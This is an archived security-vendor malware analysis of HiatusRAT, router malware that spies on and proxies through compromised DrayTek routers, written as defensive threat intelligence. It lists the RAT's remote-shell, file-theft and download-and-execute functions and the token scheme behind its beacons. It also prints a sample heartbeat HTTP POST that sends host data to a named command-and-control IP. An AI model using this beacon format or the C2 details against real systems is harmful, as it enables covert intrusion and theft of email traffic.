{
    "id": "c46b4fb2-7a9d-4ca4-996a-809a7652d568",
    "created_at": "2023-04-05T02:08:58.657952Z",
    "updated_at": "2025-03-27T02:06:08.593601Z",
    "deleted_at": null,
    "sha1_hash": "b553443ecadd7d6591c7752381a52f69542cca92",
    "title": "2023-03-06 - New HiatusRAT Router Malware Covertly Spies On Victims",
    "authors": "",
    "file_creation_date": "2023-04-03T08:25:50Z",
    "file_modification_date": "2023-04-03T08:25:50Z",
    "file_size": 933985,
    "plain_text": "# New HiatusRAT router malware covertly spies on victims\n\n**[blog.lumen.com/new-hiatusrat-router-malware-covertly-spies-on-victims/](https://blog.lumen.com/new-hiatusrat-router-malware-covertly-spies-on-victims/)**\n\nMarch 6, 2023\n\n[Black Lotus Labs\nPosted On March 6, 2023](https://blog.lumen.com/author/black-lotus-labs/)\n\n[0](https://blog.lumen.com/new-hiatusrat-router-malware-covertly-spies-on-victims/#respond)\n\n## Executive Summary\n\nJust nine months after discovering ZuoRAT – a novel malware targeting small office/home\noffice (SOHO) routers – Lumen Black Lotus Labs identified another, never-before-seen®\ncampaign involving compromised routers. This is a complex campaign we are calling\n“Hiatus”. It infects business-grade routers and deploys two malicious binaries, including a\nRemote Access Trojan (RAT) we’re calling HiatusRAT, and a variant of tcpdump that enables\npacket capture on the target device.\n\nOnce a targeted system is infected, HiatusRAT allows the threat actor to remotely interact\nwith the system, and it utilizes prebuilt functionality – some of which is highly unusual – to\nconvert the compromised machine into a covert proxy for the threat actor. The packet\n\n-----\n\ncapture binary enables the actor to monitor router traffic on ports associated with email and\nfile-transfer communications.\n\nUsing proprietary telemetry from the Lumen global IP backbone, we enumerated command\nand control (C2) infrastructure associated with the activity and have identified at least 100\ninfected victims, predominately in Europe and Latin America. The latest version of the\nmalware, version 1.5, became active in July 2022.\n\n## Introduction\n\nThe threat actors behind the Hiatus campaign primarily operationalized end-of-life DrayTek\nVigor models 2960 and 3900 running an i386 architecture. Our investigation also uncovered\nprebuilt binaries that target MIPS, i386 and ARM-based architectures.\n\nThe impacted models are high-bandwidth routers that can support VPN connections for\nhundreds of remote workers and offer ideal capacity for the average, medium-sized\nbusiness. We suspect the actor infects targets of interest for data collection, and targets of\nopportunity for the purpose of establishing a covert proxy network.\n\nThis campaign is comprised of three main components. These include:\n\na bash script that gets deployed post-exploitation and two executables retrieved by the\nbash script\nHiatusRAT\na variant of tcpdump that enables packet capture.\n\nOur analysis of HiatusRAT shows that it serves two purposes: 1.) to remotely interact with\nthe impacted device, which allows the actor to download files or run arbitrary commands,\nand 2.) to serve as a SOCKS5 proxy device on the router. This is likely to enable the actor to\nproxy command-and-control traffic through the router to obfuscate command and control\nfrom an additional agent elsewhere.\n\n\n-----\n\nFigure 1: Graphic showing how an infected router could be used to passively sniff traffic, then\nsend it to the upload C2\n\nThe tcpdump binary, which enables packet capture, allows the actor to monitor traffic on\nports associated with email and file-transfer communications from the adjacent LAN.\n\nThe Black Lotus Labs analysis indicates the latest Hiatus campaign started in July 2022, but\nwe suspect this activity cluster predates 2022. Through our global telemetry, we have\nobserved approximately 100 bots connected with Hiatus. This is approximately 2% of the\ntotal number of DrayTek 2960 and 3900 routers that are currently exposed to the internet.\nThis suggests the threat actor is intentionally maintaining a minimal footprint to limit their\nexposure and maintain critical points of presence.\n\nThere has been a small amount of reporting on compromised routers being used as proxy\ninfrastructure, and for covert data collection and malware c2 obfuscation. For example, the\nMicrosoft Threat Intelligence Team (MSTIC) recently [issued a report stating that China-based](https://www.microsoft.com/en-us/security/blog/2022/11/10/microsoft-threat-intelligence-presented-at-cyberwarcon-2022/)\nactors are leveraging vulnerable SOHO routers to maintain persistence and collect\n\n\n-----\n\n[intelligence for espionage. This followed our own discovery of ZuoRAT – a previously](https://blog.lumen.com/zuorat-hijacks-soho-routers-to-silently-stalk-networks/)\nunknown malware campaign that began targeting SOHO routers to deploy malware on the\nadjacent LAN.\n\nBecause we have not observed any overlap or correlations between HiatusRAT and any\npublic reporting, we assess that HiatusRAT is a unique cluster.\n\n## Technical Details\n\nBlack Lotus Labs recently discovered a series of malicious files that triggered an\ninvestigation into an undocumented activity cluster utilizing DrayTek routers. We are currently\nunable to determine the initial access vector; however, once exploited, the threat actor\ndeploys a bash script that downloads and executes two malicious binaries – HiatusRAT and\na packet-capture binary – on the compromised host.\n\nHiatusRAT – the main trojan– is the most unique aspect of the campaign. The threat actor\nnamed the file “qwert_8h_{architecture}”, where {architecture} corresponded with the host\narchitecture. For example, the i386 variant was called “qwert_8h_i386.”\n\n[The second file is a variant of tcpdump, which allows the threat actor to perform packet](https://web.archive.org/web/20230216210400/https:/www.git2get.com/t/5rXQChMtk97h)\ncapture on the data traversing the router. We found four variants of the packet capture\nbinaries with the same functionality compiled for ARM, i386, MIPS64 big endian and MIPS32\nlittle endian. Once downloaded, the files were copied into a new, threat actor-created\ndirectory called “database”.\n\n## Malware Overview: HiatusRAT\n\n### Host-Based Enumeration\n\nOnce executed, HiatusRAT performs two functions:\n\nIt checks for any existing processes on port 8816 and opens a listener on that port. If\nthere is already a service running on port 8816, the malware first kills the existing\nprocess to ensure that only a single instance of the trojan is running on the\ncompromised device.\nOnce the listener is enabled on port 8816, a second process collects more information\nabout the infected host and places it into an enumeration file that is sent to the\nheartbeat C2. This allows the threat actor to track if the device is still infected and\naccessible while it logs information about the compromised host.\n\nThe host-based enumeration can be broken up into four basic categories: system level\ninformation, networking information, information about the file system and a process list.\n\n\n-----\n\n**1. System-level Information**\nThe system-level details contained the following information about the infected router:\n\nMAC address\n\nKernel version\n\nArchitecture\n\nFirmware release version\n\n**2. Networking Information**\nThe network information the agent collects includes ifconfig command outputs and the ARP\ncache. The former reveals the public IP address of the router; the latter reveals the local IP\naddresses and MACs of the devices on the adjacent local area network (LAN). This visibility\ninto the router’s adjacent network is potential evidence of additional targeting opportunities.\n\n**3. File System Information**\n\nTo assess the presence of any other files running on the router, the agent enumerates the file\nsystem mounts. The purpose is to gather all the mount point names, directory-level path\nlocations, and the file system type, and to check ‘fstab’ for more information about the virtual\nmemory file system. We suspect this allows the actor to identify other executables that were\nrunning purely in-memory and did not correspond to a file written to disk, which is a\nmechanism associated with some malware families.\n\n**4. Process List**\n\nHiatusRAT gathers information about the running processes such as the process name, ID,\nUID, and arguments, along with information about HiatusRAT itself.\n\nOnce the agent has all the host-based information, it reads from a JSON blob, referred to as\nthe configuration file, to determine where the heartbeat server is located to send the\ninformation back to the threat actor. When we analyzed the configuration file, we also\nidentified a second C2 server denoted as “Upload” that is used by the packet-capture binary.\n\nA parsed version of the embedded configuration information can be found in the following\ntable:\n\n\n-----\n\nFigure 2: Screenshot of the dissembled, hard-coded configuration file Heartbeat POST\n\nIn the sample we observed, at a set interval of 28,000 seconds (8 hours), enumeration file\ninformation was gathered and became part of the heartbeat beacon sent to the heartbeat C2\nvia HTTP POST. This included a header containing additional information about the router’s\nstatus.\n\nThe heartbeat POST request contains multiple header fields, likely used to help the threat\nactor meticulously track the status of each compromised router. Some fields are intuitive,\nsuch as the X_UTIME (denoted as the current time in epoch), and X_UUID (denoted as the\n\n\n-----\n\nMAC address). Other values such as the X_TOKEN likely denote a type of checksum of the\nfields to ensure the activity was stemming from a compromised host. The X_TOKEN header\nis computed as: Md5(time[:time % 10] + MAC address + time[time % 10:]). The time value is\ndenoted in epoch.\n\n**Pseudo Code Example of X_TOKEN Generation:**\n\nsys_time response – 1674762549\n\nMAC address – 005056c00001\n\n“167476254” + “005056c00001” + “9” = “167476254005056c000019”\n\nMd5(“167476254005056c000019”) = ffca0c6ca91ce7070c3e5e41d7c983a2\n**Example Headers:**\n\n“POST /master/Api/active?uuid=005056c00001 HTTP/1.1”\n\nHost: 104.250.48[.]192:443\n\nAccept: */*\n\nContent-Type: application/json\n\nX_UTIME: 1674762549\n\nX_UUID: 005056c00001\n\nX_TOKEN: ffca0c6ca91ce7070c3e5e41d7c983a2\n\nContent-Length: 37228\n\n### Prebuilt Functions\n\nDuring our analysis of the HiatusRAT file, we were able to reverse engineer its prebuilt\nfunctions. The function names and their utilities are listed below. At the time of this report, we\nare unable to determine whether the threat actor is operationalizing any of these features.\n\n**config – Loads new config values from the C2 node.**\n**shell – Spawns a remote shell on the infected host.**\n**file – Allows reading, deleting, or uploading files to the heartbeat C2.**\n**executor – Downloads and executes a file from the heartbeat C2.**\n**script – Executes a script supplied by the C2.**\n**tcp_forward– Takes a specified listening port, forwarding IP, and forwarding port and**\ntransmits any TCP data that was sent to the listening port on the compromised host to\nthe forwarding location. The function checks if an existing listener is already running; if\nnot, it opens a listener on a specified port. Upon establishing a connection, tcp_foward\nestablishes two threads to allow for bi-directional communications between the sender\nand the specified forwarding IP.\n**socks5 – Sets up a SOCKS version 5 proxy on the compromised router, establishing a**\n[listening port and forwarding capability in accordance with RFC 1928.](https://datatracker.ietf.org/doc/html/rfc1928)\n**quit – Ceases execution of the malware.**\n\n\n-----\n\nFigure 3: Screenshot of the dissembled tcp_forward function\n\nWhile functions like config and shell are common commands for RATs, SOCKS5 and\ntcp_foward are purpose-built to enable obfuscated communications from other machines\n(like those infected with another RAT) through the Hiatus victims. The TCP function,\nhowever, is more straight-forward. It opens a listener on a port, then forwards the TCP data\nto another IP address and port. We assess that this was likely designed to forward beacons\nor exfil from another RAT on another infected machine, which would allow the router to be a\nC2 IP address for malware on a separate device.\n\n\n-----\n\n[Based upon the information in the SOCKS 5 documentation, referenced as RFC 1928, this](https://datatracker.ietf.org/doc/html/rfc1928)\nfunction differs in that it allows for more flexibility. This means SOCKS 5 can support UDPbased connections, IPv6 connections, and an optional authentication field such as a\nusername and password, or a token. The threat actor could use the SOCKS proxy to either\nreceive forward beacons from a beaconing agent, or forward commands sent to a passive\nagent such as a web shell. This would allow the threat actor to interact with another agent\nfrom a compromised IP address and more closely mimic legitimate behavior. This tactic\nwould allow the actor to circumvent some detection capabilities based on geo-fencing or\nconnections associated with bulletproof hosting providers.\n\nFigure 4: Overview of how the redirection functionality on the router could be used to interact\nwith both beaconing and listening agents\n\n## Malware Overview – Packet-capture binary\n\nIn addition to the HiatusRAT, the bash script installs a second binary to perform packet\ncapture on data traversing the router. We found four variants of the tcpdump binary which\nenabled packet capture with the same functionality compiled for ARM, i386, MIPS64 big\nendian, and MIPS32 little endian. This file appears to be a compiled version of three\ncommon libraries: tcpdump, libpcap, and openSSL. The bash script also specifies that the\npacket-capture tool collects outbound connections associated with the following ports:\n\n\n-----\n\nPort 21 – associated with File Transfer Protocol (FTP)\nPort 25 – associated with Simple Mail Transfer Protocol (SMTP)\nPort 110 – associated with Post Office Protocol 3 (POP3)\nPort 143 – associated with Internet Mail Access Protocol (IMAP)\n\nOnce this packet capture data reaches a certain file length, it is sent to the “upload C2”\nlocated at 46.8.113[.]227 along with information about the host router. This allows the threat\nactor to passively capture email traffic that traversed the router and some file transfer traffic.\nWhile these are the ports that are specified in the recovered bash script, it would be trivial for\nthe threat actor to specify additional ports via a shell spawned by HiatusRAT. We suspect\nthat if the threat actor identifies a victim of high interest, they can potentially deploy\nsubsequent modules for added functionality.\n\n## Black Lotus Labs Global Telemetry and Analysis\n\nOnce we extracted the C2 nodes from the configuration file in the HiatusRAT file, we looked\nfor more information about those nodes. We observed that both the heartbeat and upload C2\nnodes had a self-signed X.509 certificate, both of which were first observed on July 21, 2022.\nThis likely indicates the beginning of the operation that utilized version 1.5 of the agent.\n\nBlack Lotus Labs global telemetry identified approximately 100 unique IP addresses in\ncommunication with the C2 IPs. We divided those IP addresses into two categories of\npotential victims:\n\nMore established, medium-size businesses that run their own mail servers, and\nsometimes have dedicated internet lines. These networks utilize DrayTek routers as the\ngateway to their corporate network, which routes traffic from email servers on the LAN\nto the public internet. Some of the impacted verticals include pharmaceuticals, IT\nservices/consulting firms, and a municipal government – among others. We suspect the\nIT firms were chosen to enable downstream access to customer environments, which\ncould be enabled from collected data like the email traffic gathered by the packetcapture binary.\nWhen we queried the IPs and were unable to observe any mail servers, we associated\nthe second group of compromised entities within ISP customer ranges. These\ninfections potentially occurred because the actors identified them as smaller\norganizations of interest, or they were instances when the threat actor utilized the\nrelay/forwarding functions of Hiatus to interact with another infection network.\n\nOf the victims we were able to identify since October 2022, most of the bot-related IP\naddresses geo-located to Europe. Interestingly, our telemetry indicated the most activity in\nLatin America, followed closely by Europe, then North America. (Note: We did not observe\nany bots located in Australia or New Zealand.)\n\n\n-----\n\nFigure 5: Screenshot of the global heatmap showing the distribution of bots from Oct. 1,\n2022, through Feb. 20, 2023\n\nAs of mid-February 2023, there were approximately 2,700 DrayTek Vigor 2960 routers and\napproximately 1,400 DrayTek Vigor 3900 routers exposed on the internet, and Hiatus had\ncompromised approximately 100 of these routers. This campaign is significantly smaller than\n[some of the more prominent botnets such as Emotet or](https://blog.lumen.com/emotet-redux/) [Chaos – both of which](https://blog.lumen.com/chaos-is-a-go-based-swiss-army-knife-of-malware/)\nindiscriminately target vulnerable devices on the internet. We assess that the threat actor\nmost likely chose to keep the campaign small to evade detection.\n\n## Conclusion\n\nWhile advanced threat actors continue bombarding routers, Black Lotus Labs remains\ncommitted to hunting these elusive campaigns. We assess that the class of malicious activity\ndescribed in this report remains concerning because it allows the threat actor to passively\ncollect information without directly interacting with a high-value host – activity that could\ntrigger detection and response (EDR) products. Additionally, by utilizing routers, the\nadversary’s tools reside on the victim’s network, which is outside the traditional defense-indepth perimeter.\n\n\n-----\n\n[While our prior reporting on router campaigns such as Zuorat and a](https://blog.lumen.com/zuorat-hijacks-soho-routers-to-silently-stalk-networks/) 2021 hacktivist\ncampaign highlighted instances where threat actors attempted to modify or block traffic\npassing through compromised routers, the Hiatus campaign adds the additional capability of\nleveraging router access to passively monitor and exfiltrate router traffic.\n\nIn addition, we assess that the Hiatus campaign had a secondary purpose with covert\ncommand and control operations that utilize multiple compromised assets. The HiatusRAT\ntcp_forward function allows a threat actor to relay their beaconing from a separate infection\nthrough a compromised device before hitting an upstream C2 node. Conversely, they can\nalso echo their command to a web shell from upstream infrastructure through the\ncompromised router in the country of the targeted device, then interact with a more passive\nagent to obscure their true origination source by passing geo-fencing-based security\nmeasures.\n\nThis campaign shows the need to secure the router ecosystem. This type of agent\ndemonstrates that anyone with a router who uses the internet can potentially be a target –\nand they can be used as proxy for another campaign – even if the entity that owns the router\ndoes not view themselves as an intelligence target. We suspect that threat actors are going\nto continue to utilize multiple compromised assets in conjunction with one another to avoid\ndetection.\n\nBlack Lotus Labs has added the IoCs from this campaign into the threat intelligence feed that\nfuels the Lumen Connected Security portfolio, and we continue to monitor for new\ninfrastructure, targeting activity. and expanding tactics, techniques, and procedures (TTPs).\nWe will continue to collaborate with the security research community to share findings related\nto this activity and ensure the public is informed. We encourage the community to monitor for\nand alert on these and any similar IoCs. We also advise the following:\n\n**Consumers with self-managed routers should follow best practices and regularly**\nmonitor, reboot and install security updates and patches. End-of-life devices should be\nreplaced with vendor-supported model to ensure patching against known\nvulnerabilities.\n**Businesses should consider comprehensive Secure Access Service Edge (SASE) or**\nsimilar solutions that utilize VPN-based access to protect data and bolster their security\nposture.\n**Users should enable the latest cryptographic protocols to help protect data in transit,**\nsuch as only using email service which rely upon SSL and TLS. Examples of more\nsecure email services include secure simple mail transfer protocol (defined in RFC\n2821 and utilizing the feature which terminates if a secure connections can’t be\n[established), encrypted IMAP, and encrypted POP3 (defined in RFC 2595 which](https://www.rfc-editor.org/rfc/rfc2595)\nutilized ports 993 & 995).\n\n[For additional IoCs associated with this campaign, please visit our GitHub page.](https://github.com/blacklotuslabs/IOCs/blob/main/Hiatus_IoCs.txt)\n\n\n-----\n\nIf you would like to collaborate on similar research, please contact us on Twitter and\nMastadon @BlackLotusLabs.\n\nThis analysis was performed by Danny Adamitis and Steve Rudd.\n\nThis information is provided “as is” without any warranty or condition of any kind, either\nexpress or implied. Use of this information is at the end user’s own risk.\n\nServices not available everywhere. ©2022 Lumen Technologies. All Rights Reserved.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-03-06 - New HiatusRAT Router Malware Covertly Spies On Victims.pdf"
    ],
    "report_names": [
        "2023-03-06 - New HiatusRAT Router Malware Covertly Spies On Victims.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1680660538,
    "ts_updated_at": 1743041168,
    "ts_creation_date": 1680510350,
    "ts_modification_date": 1680510350,
    "files": {
        "pdf": "https://archive.orkl.eu/b553443ecadd7d6591c7752381a52f69542cca92.pdf",
        "text": "https://archive.orkl.eu/b553443ecadd7d6591c7752381a52f69542cca92.txt",
        "img": "https://archive.orkl.eu/b553443ecadd7d6591c7752381a52f69542cca92.jpg"
    }
}